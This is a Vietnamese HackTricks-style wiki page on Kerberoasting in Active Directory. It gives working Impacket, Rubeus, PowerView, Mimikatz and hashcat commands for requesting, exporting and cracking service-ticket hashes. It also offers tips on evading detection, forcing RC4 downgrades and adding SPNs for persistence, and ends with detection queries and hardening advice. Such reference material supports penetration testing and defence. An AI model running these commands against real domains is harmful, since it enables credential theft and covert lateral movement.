# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting tập trung vào việc thu thập vé TGS, cụ thể là những vé liên quan đến các dịch vụ chạy dưới tài khoản người dùng trong Active Directory (AD), không bao gồm tài khoản máy tính. Các vé này được mã hóa bằng khóa bắt nguồn từ mật khẩu người dùng, cho phép crack thông tin xác thực offline. Việc dùng tài khoản người dùng làm dịch vụ được thể hiện qua thuộc tính ServicePrincipalName (SPN) không rỗng.

Bất kỳ người dùng domain nào đã xác thực cũng có thể yêu cầu vé TGS, nên không cần đặc quyền đặc biệt.<sup>[[4]](#references)[[5]](#references)</sup>

### Điểm chính

- Nhắm vào vé TGS của các dịch vụ chạy dưới tài khoản người dùng (tức tài khoản có SPN được thiết lập; không phải tài khoản máy tính).
- Vé được mã hóa bằng khóa dẫn xuất từ mật khẩu tài khoản dịch vụ và có thể bị crack offline.
- Không cần đặc quyền cao; bất kỳ tài khoản đã xác thực nào cũng có thể yêu cầu vé TGS.

> [!WARNING]
> Hầu hết công cụ công khai ưu tiên yêu cầu vé dịch vụ RC4-HMAC (etype 23) vì crack nhanh hơn AES. Hash TGS RC4 bắt đầu bằng `$krb5tgs$23$*`, AES128 bằng `$krb5tgs$17$*`, và AES256 bằng `$krb5tgs$18$*`. Tuy nhiên, nhiều môi trường đang chuyển sang chỉ dùng AES. Đừng cho rằng chỉ RC4 mới đáng quan tâm.
> Ngoài ra, tránh kiểu roast “spray-and-pray”. Kerberoast mặc định của Rubeus có thể truy vấn và yêu cầu vé cho mọi SPN, gây nhiều dấu vết. Trước tiên hãy liệt kê và nhắm vào các principal đáng chú ý.

### Bí mật tài khoản dịch vụ và chi phí mã hóa Kerberos

Nhiều dịch vụ vẫn chạy dưới tài khoản người dùng với mật khẩu được quản lý thủ công. KDC mã hóa vé dịch vụ bằng các khóa dẫn xuất từ những mật khẩu đó rồi gửi ciphertext cho mọi principal đã xác thực, vì vậy kerberoasting cho phép thử đoán offline không giới hạn mà không gây khóa tài khoản hay tạo telemetry trên DC. Chế độ mã hóa quyết định mức tài nguyên cần để crack:

| Chế độ | Dẫn xuất khóa | Loại mã hóa | Thông lượng ước tính của RTX 5090* | Ghi chú |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 với 4.096 vòng lặp và salt riêng cho từng principal, được tạo từ domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 triệu lần đoán/giây | Salt ngăn rainbow table nhưng vẫn cho phép crack nhanh các mật khẩu ngắn. |
| RC4 + NT hash | Một lần MD4 trên mật khẩu (NT hash không có salt); Kerberos chỉ trộn thêm confounder 8 byte cho mỗi vé | etype 23 (`$krb5tgs$23$`) | ~4.18 **tỷ** lần đoán/giây | Nhanh hơn AES ~1000 lần; attacker ép dùng RC4 bất cứ khi nào `msDS-SupportedEncryptionTypes` cho phép. |

*Benchmark từ Chick3nman, được trích dẫn trong [phân tích Kerberoasting của Matthew Green](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

Confounder của RC4 chỉ ngẫu nhiên hóa keystream; nó không làm tăng khối lượng công việc cho mỗi lần đoán. Nếu tài khoản dịch vụ không dùng bí mật ngẫu nhiên (gMSA/dMSA, tài khoản máy hoặc chuỗi được quản lý bằng vault), tốc độ xâm nhập hoàn toàn phụ thuộc vào năng lực GPU. Bắt buộc chỉ dùng etype AES sẽ loại bỏ khả năng hạ cấp xuống tốc độ hàng tỷ lần đoán mỗi giây, nhưng mật khẩu yếu do con người đặt vẫn có thể bị crack bằng PBKDF2.<sup>[[3]](#references)</sup>

### Tấn công

#### Linux

Có ví dụ thực tế từ đầu đến cuối về cách dùng NetExec để yêu cầu các vé có thể roast và Hashcat để crack chúng trong tài liệu tham khảo [1].<sup>[[1]](#references)</sup>

```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```

Các công cụ đa tính năng bao gồm kiểm tra kerberoast:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```

#### Windows

- Liệt kê người dùng có thể bị Kerberoast

```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```

- Kỹ thuật 1: Yêu cầu TGS và dump từ bộ nhớ

```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```

- Kỹ thuật 2: Công cụ tự động

```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```

> [!WARNING]
> Một yêu cầu TGS tạo Windows Security Event 4769 (Đã yêu cầu vé dịch vụ Kerberos).

### OPSEC và môi trường chỉ dùng AES

- Cố ý yêu cầu RC4 cho các tài khoản không có AES:
  - Rubeus: `/rc4opsec` dùng tgtdeleg để liệt kê các tài khoản không có AES và yêu cầu vé dịch vụ RC4.
  - Rubeus: `/tgtdeleg` kết hợp với kerberoast cũng kích hoạt yêu cầu RC4 khi có thể.<sup>[[6]](#references)</sup>
- Roast các tài khoản chỉ dùng AES thay vì âm thầm thất bại:
  - Rubeus: `/aes` liệt kê các tài khoản đã bật AES và yêu cầu vé dịch vụ AES (etype 17/18).
  - Nếu bạn đã có TGT (PTT hoặc từ tệp .kirbi), bạn có thể dùng `/ticket:<blob|path>` cùng với `/spn:<SPN>` hoặc `/spns:<file>` để bỏ qua LDAP.
- Nhắm mục tiêu, giới hạn tốc độ và giảm dấu vết:
  - Dùng `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` và `/jitter:<1-100>`.
  - Lọc các tài khoản có khả năng dùng mật khẩu yếu bằng `/pwdsetbefore:<MM-dd-yyyy>` (mật khẩu cũ hơn) hoặc nhắm đến các OU có đặc quyền bằng `/ou:<DN>`.<sup>[[8]](#references)</sup>

Ví dụ (Rubeus):

```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```

### Cracking

```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```

### Duy trì quyền truy cập / Lạm dụng

Nếu bạn kiểm soát hoặc có thể sửa đổi một tài khoản, bạn có thể khiến tài khoản đó kerberoastable bằng cách thêm SPN:

```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```

Hạ cấp một tài khoản để bật RC4, giúp cracking dễ dàng hơn (cần có quyền ghi trên object mục tiêu):

```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```

#### Targeted Kerberoast qua GenericWrite/GenericAll trên một user (SPN tạm thời)

Khi BloodHound cho thấy bạn có quyền kiểm soát một user object (ví dụ: GenericWrite/GenericAll), bạn có thể “targeted-roast” user cụ thể đó một cách đáng tin cậy, ngay cả khi hiện tại họ không có SPN nào:<sup>[[9]](#references)</sup>

- Thêm SPN tạm thời vào user được kiểm soát để user đó có thể bị roast.
- Yêu cầu TGS-REP được mã hóa bằng RC4 (etype 23) cho SPN đó để ưu tiên việc crack.
- Dùng hashcat để crack hash `$krb5tgs$23$...`.
- Xóa SPN để giảm footprint.

Windows (PowerView/Rubeus):

```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```

Linux one-liner (targetedKerberoast.py tự động hóa việc thêm SPN -> yêu cầu TGS (etype 23) -> xóa SPN):<sup>[[2]](#references)</sup>

```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```

Crack output bằng hashcat autodetect (mode 13100 cho `$krb5tgs$23$`):

```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```

Ghi chú về phát hiện: việc thêm/xóa SPN tạo ra các thay đổi trong directory (Event ID 5136/4738 trên user mục tiêu), còn yêu cầu TGS tạo ra Event ID 4769. Hãy cân nhắc điều tiết tần suất và dọn dẹp ngay.

Bạn có thể tìm thấy các công cụ hữu ích cho các cuộc tấn công kerberoast tại đây: https://github.com/nidem/kerberoast

Nếu gặp lỗi này trên Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, nguyên nhân là do độ lệch giờ cục bộ. Đồng bộ thời gian với DC:

- `ntpdate <DC_IP>` (không còn được khuyến nghị trên một số distro)
- `rdate -n <DC_IP>`

### Kerberoast không cần tài khoản domain (AS-requested STs)

Vào tháng 9 năm 2022, Charlie Clark cho thấy rằng nếu một principal không yêu cầu pre-authentication, ta có thể lấy service ticket thông qua một KRB_AS_REQ được tạo thủ công bằng cách thay đổi sname trong phần thân yêu cầu, qua đó lấy service ticket thay vì TGT. Cách này tương tự AS-REP roasting và không yêu cầu thông tin xác thực domain hợp lệ.

Xem chi tiết: bài viết của Semperis “New Attack Paths: AS-requested STs”.<sup>[[10]](#references)</sup>

> [!WARNING]
> Bạn phải cung cấp danh sách user vì không có thông tin xác thực hợp lệ thì không thể truy vấn LDAP bằng kỹ thuật này.

Linux

- Impacket (PR #1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```

Windows

- Rubeus (PR #139):

```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```

Liên quan

Nếu bạn đang nhắm mục tiêu vào các user có thể bị AS-REP roast, hãy xem thêm:

{{#ref}}
asreproast.md
{{#endref}}

### Phát hiện

Kerberoasting có thể khó bị phát hiện. Tìm Event ID 4769 từ các DC và áp dụng bộ lọc để giảm nhiễu:

- Loại trừ service name `krbtgt` và các service name kết thúc bằng `$` (tài khoản máy tính).
- Loại trừ các yêu cầu từ tài khoản máy (`*$$@*`).
- Chỉ lấy các yêu cầu thành công (Failure Code `0x0`).
- Theo dõi các loại mã hóa: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Không chỉ cảnh báo với `0x17`.

Ví dụ PowerShell để phân loại ban đầu:

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
  Where-Object {
    ($_.Message -notmatch 'krbtgt') -and
    ($_.Message -notmatch '\$$') -and
    ($_.Message -match 'Failure Code:\s+0x0') -and
    ($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
    ($_.Message -notmatch '\$@')
  } |
  Select-Object -ExpandProperty Message
```

Ý tưởng bổ sung:

- Thiết lập baseline về cách sử dụng SPN bình thường theo từng host/user; cảnh báo khi một principal gửi nhiều yêu cầu SPN khác nhau trong thời gian ngắn.
- Đánh dấu việc sử dụng RC4 bất thường trong các domain đã được harden bằng AES.

### Giảm thiểu / Hardening

- Dùng gMSA/dMSA hoặc machine account cho các dịch vụ. Tài khoản được quản lý có mật khẩu ngẫu nhiên dài hơn 120 ký tự và tự động xoay vòng, khiến việc cracking offline không thực tế.<sup>[[7]](#references)</sup>
- Bắt buộc dùng AES cho service account bằng cách đặt `msDS-SupportedEncryptionTypes` chỉ dùng AES (thập phân 24 / thập lục phân 0x18), sau đó xoay vòng mật khẩu để các khóa AES được tạo.<sup>[[7]](#references)</sup>
- Nếu có thể, hãy tắt RC4 trong môi trường của bạn và giám sát các lần thử sử dụng RC4. Trên DC, bạn có thể dùng giá trị registry `DefaultDomainSupportedEncTypes` để điều chỉnh các giá trị mặc định cho những account chưa đặt `msDS-SupportedEncryptionTypes`. Hãy kiểm tra kỹ lưỡng.
- Xóa các SPN không cần thiết khỏi user account.<sup>[[7]](#references)</sup>
- Nếu không thể dùng tài khoản được quản lý, hãy dùng mật khẩu service account dài, ngẫu nhiên (từ 25 ký tự trở lên); cấm các mật khẩu phổ biến và thường xuyên kiểm tra.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + cracking hashcat trong thực tế](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: Tấn công tác động lớn, kỹ thuật thấp từ mật mã Kerberos lỗi thời (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Tấn công Kerberos như thế nào?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Lạm dụng Active Directory Kerberos: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: Yêu cầu TGS được mã hóa bằng RC4 khi AES được bật](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Hướng dẫn của Microsoft giúp giảm thiểu Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Tài liệu lệnh kerberoast của Rubeus](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — thông tin xác thực SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync để lên DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – Đường tấn công mới? AS Requested Service Tickets (Charlie Clark, Sept 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
